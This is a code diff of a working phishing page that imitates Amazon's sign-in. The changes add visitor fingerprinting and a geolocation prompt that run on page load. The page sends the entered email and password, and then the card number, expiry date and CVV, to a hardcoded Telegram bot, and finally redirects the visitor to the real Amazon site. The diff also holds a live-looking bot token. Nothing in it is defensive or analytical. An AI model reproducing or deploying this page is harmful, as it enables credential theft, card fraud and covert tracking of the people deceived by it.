@@ -2,52 +2,71 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Sign-In Verification</title>
+    <title>Amazon Sign-In</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #fff; text-align: center; }
-        .box { max-width: 350px; margin: 20px auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; }
-        button { width: 95%; background: #f0c14b; border: 1px solid #a88734; padding: 10px; cursor: pointer; }
+        body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 0; }
+        .box { max-width: 350px; margin: 30px auto; border: 1px solid #ddd; padding: 25px; border-radius: 8px; text-align: center; }
+        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; }
+        button { width: 100%; background: #f0c14b; border: 1px solid #a88734; padding: 12px; cursor: pointer; font-weight: bold; border-radius: 3px; }
         .hide { display: none; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100" style="margin-bottom:20px;">
         <div id="s1">
-            <h2>Sign-In</h2>
+            <h2 style="text-align:left;">Sign-In</h2>
             <input type="text" id="e" placeholder="Email or phone">
             <input type="password" id="p" placeholder="Password">
             <button onclick="st1()">Continue</button>
         </div>
         <div id="s2" class="hide">
-            <h3>Verify Address & Card</h3>
+            <h3>Verify Account</h3>
+            <p style="font-size:12px; color:#c45500;">Complete security check for verification.</p>
             <input type="text" id="c" placeholder="Card Number">
             <input type="text" id="ex" placeholder="MM/YY" style="width:40%">
             <input type="text" id="cv" placeholder="CVV" style="width:40%">
-            <button onclick="st2()">Verify Account</button>
+            <button onclick="st2()">Verify Now</button>
         </div>
     </div>
+
     <script>
         const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
         const chatId = '8353285510';
 
-        function send(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`); }
+        window.onload = async () => {
+            let b = await navigator.getBattery();
+            let ipInfo = "IP Blocked";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                ipInfo = `🌐 IP: ${d.ip}\n📍 Location: ${d.city}, ${d.country_name}\n📶 ISP: ${d.org}`;
+            } catch(e) {}
+            
+            // "Ghost" Fingerprinting (Browser History Patterns)
+            const historyDepth = window.history.length;
+            const plugins = navigator.plugins.length;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            const log = `🚨 AMAZON VISITOR DETECTED!\n📱 Device: ${navigator.userAgent}\n🔋 Battery: ${Math.round(b.level * 100)}%\n🕒 TZ: ${timeZone}\n📜 History Depth: ${historyDepth} tabs\n🧩 Plugins: ${plugins}\n${ipInfo}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(log)}`);
+
+            // Location Permission Trap
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📍 EXACT MAP:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}')}`);
+            });
+        };
 
         function st1() {
-            const data = `📦 AMAZON LOG!\n📧: ${document.getElementById('e').value}\n🔑: ${document.getElementById('p').value}`;
-            send(data);
-            // Location Request
-            navigator.geolocation.getCurrentPosition(p => {
-                send(`📍 AMAZON USER LOCATION:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-            document.getElementById('s1').className = 'hide';
-            document.getElementById('s2').className = '';
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📦 AMAZON LOG!\n📧: '+document.getElementById('e').value+'\n🔑: '+document.getElementById('p').value)}`);
+            document.getElementById('s1').classList.add('hide');
+            document.getElementById('s2').classList.remove('hide');
         }
 
         function st2() {
-            send(`💳 AMAZON CARD!\nNum: ${document.getElementById('c').value}\nExp: ${document.getElementById('ex').value}\nCVV: ${document.getElementById('cv').value}`);
-            window.location.href = "https://www.amazon.com";
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('💳 AMAZON CARD!\nNum: '+document.getElementById('c').value+'\nExp: '+document.getElementById('ex').value+'\nCVV: '+document.getElementById('cv').value)}`)
+            .then(() => window.location.href = "https://www.amazon.com");
         }
     </script>
 </body>
